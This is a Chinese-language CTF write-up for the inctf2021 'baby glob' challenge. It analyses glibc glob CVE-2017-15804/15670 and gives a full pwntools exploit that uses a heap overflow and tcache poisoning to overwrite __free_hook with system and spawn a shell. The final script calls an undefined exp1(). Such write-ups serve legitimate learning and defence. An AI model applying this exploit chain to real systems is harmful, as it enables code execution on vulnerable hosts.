---
title: inctf2021_babyglob
date: 2021-08-20 11:58:11
permalink: /pages/2247de/
categories:
  - ctf_wp
  - inctf
tags:
  - 
---
# inctf2021 baby glob 

[[toc]]

赛时没去看的一个题目, 发现其实是个cve题目, 比较简单, 这题有点亏,

## 分析

题目给了个菜单题, 但是并没有看出来什么漏洞, 检查路径的部分跳到了`glob.c`文件中, 可以看到注释说这是glibc中的一部分, 2017年的版本, 

题目描述也说, 更加安全的`glob`已经从2017年开始运行, 逆向稍微看下题目二进制文件, 题目本身虽然使用ubuntu20.04(glibc 2.31), 但是glob函数还是静态编译的`glob.c`文件中的, 

然后尝试查找 glob 2017 cve等, 可以查到两个cve, [cve-2017-15804](https://sourceware.org/bugzilla/show_bug.cgi?id=22332) , [cve-2017-15670](https://sourceware.org/bugzilla/show_bug.cgi?id=22320), 

从两者的patche中可以看到对应的漏洞点

```c
# cve 2017 15804
# @@ -744,11 +744,11 @@ glob (const char *pattern, int flags, int (*errfunc) (const char *, int),
                   char *p = mempcpy (newp, dirname + 1,
                                      unescape - dirname - 1);
                   char *q = unescape;
-                  while (*q != '\0')
+                  while (q != end_name)
                     {
                       if (*q == '\\')
                         {
-                          if (q[1] == '\0')
+                          if (q + 1 == end_name)
```

```c
# cve 2017 15670
# @@ -764,7 +764,7 @@ glob (const char *pattern, int flags, int (*errfunc) (const char *, int),
                   *p = '\0';
                 }
               else
-                *((char *) mempcpy (newp, dirname + 1, end_name - dirname))
+                *((char *) mempcpy (newp, dirname + 1, end_name - dirname - 1))
```

查看题目给的`glob.c`文件,发现其实两个都有, 

### glob.c

这俩cve其实都比较简单, 都是在处理`unescape`的时候出现的问题, 两个cve也都给了对应的poc, 

我们简单调试分析下glob, 

发现输入的路径拆分为以下几个部分:

```
dirname + "\\" + unescape + "/" + endname + '/' + filename
```

其中, dirname[0] = '~', 且dirname[1] != '\'/'\x00'时会拆分出来unescape和endname, 

```c
// glob.c: 547
  if ((flags & (GLOB_TILDE|GLOB_TILDE_CHECK)) && dirname[0] == '~')
    {
      if (dirname[1] == '\0' || dirname[1] == '/'
          || (!(flags & GLOB_NOESCAPE) && dirname[1] == '\\'
              && (dirname[2] == '\0' || dirname[2] == '/')))
        // 这一层判断要进入else中
```

然后在写入unescape的时候, 会新建一个chunk, 大小为`end_name - dirname`即`dirname+unescape`的大小, 然后向其中写入数据, 

```c 
// glob.c: 734
                  newp = malloc (end_name - dirname);
                  if (newp == NULL)
                    {
                      retval = GLOB_NOSPACE;
                      goto out;
                    }
                  malloc_user_name = 1;
                }
              if (unescape != NULL)
                {
                  char *p = mempcpy (newp, dirname + 1,
                                     unescape - dirname - 1);
                  char *q = unescape;
                  // cve 2017 15804
                  while (*q != '\0')
                  // while (q != end_name)
                    {
                      if (*q == '\\')
                        {
                          if (q[1] == '\0')
                          // if (q + 1 == end_name)
                            {
                              /* "~fo\\o\\" unescape to user_name "foo\\",
                                 but "~fo\\o\\/" unescape to user_name
                                 "foo".  */
                              if (filename == NULL)
                                *p++ = '\\';
                              break;
                            }
                          ++q;
                        }
                      *p++ = *q++;
                    }
                  *p = '\0';
                }
```

配合注释中的对应cve patche可以看出来, 因为只是在对比'\x00'截断位置, 因此可能将后续的`end_name`部分也写入进去, 造成堆溢出, 

调试, 按照此格式构造了一个对应的数据, 栈溢出成功:

```python

def exp():
    payload1 = flat('~', 'd' * 0x10, '\\', 'u'*0x30, '/', 'e' * (0x30-1), '/', 'filename')
    add(0, len(payload1), payload1)
    check(0)

```

![image-20210820140755951](https://i.loli.net/2021/08/20/QJC73EDs5IjbxTf.png)



## 利用

于是我们拥有了一个堆溢出, 但是仍然要注意'\x00'截断, 伪造数据只可以伪造到size, 

于是, 思路大致是, 

通过堆布局配合glob的cve, 修改size, 从而实现堆重叠, 被覆写的堆块要先在tcache里, 这样可以伪造tcache的链表, 然后借助tcache机制分配出来free_hook, 随便free掉一个写binsh的堆块即可, 

泄漏libc地址就add一个大chunk, 然后扔到unsortedbin里, 再次取回会有残留的地址, 

```python 
def exp():

    add(0, 0x580, 'a' * 0x80)
    add(1, 0x10, '/bin/sh\x00')
    dele(0)
    add(0, 0x580, '')
    show(0)
    ru("[+] Path : ")
    leak = u64(re(8, 2))
    free_hook = leak + 0x1ce8
    libc = free_hook - 0x3ed8e8
    print(hex(leak))
    print(hex(free_hook))

    add(2, 0x40, 'a')
    add(3, 0x40, 'a')
    add(4, 0x80, 'a')
    add(5, 0x80, 'a')

    dele(2)
    dele(3)
    dele(5)

    payload1 = flat('~', p8(0xff) * 0x10, '\\', 'u' * 0x30, '/', 'e' * (0x8-1), '!\x01',  '/', 'f' * 0x5)
    add(9, len(payload1), payload1)
    check(9)

    dele(4)

    add(6, 0x110, flat('a' * 0x80, 0, 0x90, free_hook))

    add(7, 0x80, 'a' * 0x10)
    system = libc + 0x4f550
    add(8, 0x80, flat(system))
    dele(1)

```



::: details

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000002290, 0x00000000000030F0, 0x00000000000026D6]


def add(idx, size, path):
    sll('1')
    sll(str(idx))
    sll(str(size))
    sll(path)

def check(idx):
    sll('2')
    sll(str(idx))

def show(idx):
    sll('3')
    sll(str(idx))


def dele(idx):
    sll('4')
    sll(str(idx))


def exp():

    add(0, 0x580, 'a' * 0x80)
    add(1, 0x10, '/bin/sh\x00')
    dele(0)
    add(0, 0x580, '')
    show(0)
    ru("[+] Path : ")
    leak = u64(re(8, 2))
    free_hook = leak + 0x1ce8
    libc = free_hook - 0x3ed8e8
    print(hex(leak))
    print(hex(free_hook))

    add(2, 0x40, 'a')
    add(3, 0x40, 'a')
    add(4, 0x80, 'a')
    add(5, 0x80, 'a')

    dele(2)
    dele(3)
    dele(5)

    payload1 = flat('~', p8(0xff) * 0x10, '\\', 'u' * 0x30, '/', 'e' * (0x8-1), '!\x01',  '/', 'f' * 0x5)
    add(9, len(payload1), payload1)
    check(9)

    dele(4)

    add(6, 0x110, flat('a' * 0x80, 0, 0x90, free_hook))

    add(7, 0x80, 'a' * 0x10)
    system = libc + 0x4f550
    add(8, 0x80, flat(system))
    dele(1)




context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./bin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')


re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(">> ", x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp1()

slog_show()

ia()


```



:::
